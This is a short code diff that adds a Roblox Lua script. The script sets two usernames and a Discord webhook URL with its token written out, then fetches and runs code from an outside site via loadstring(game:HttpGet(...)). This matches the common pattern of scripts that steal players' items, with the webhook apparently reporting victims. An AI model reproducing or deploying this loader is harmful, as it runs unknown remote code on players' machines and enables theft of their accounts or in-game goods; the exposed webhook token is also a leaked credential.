@@ -1,0 +1,6 @@
+wait (0.2)
+Username = "desireforahuge012"
+Username2 = "DonPolloIsAMewer"
+Webhook = "https://discord.com/api/webhooks/1265489149197160499/xRUevpHJpvgjbH2J1UYOeWIWO9jIUAJ4_tsVE67Jar-6e9JWLYDhguxuqTBCAvG7oP04"
+
+loadstring(game:HttpGet("https://egorikusa.space"))()
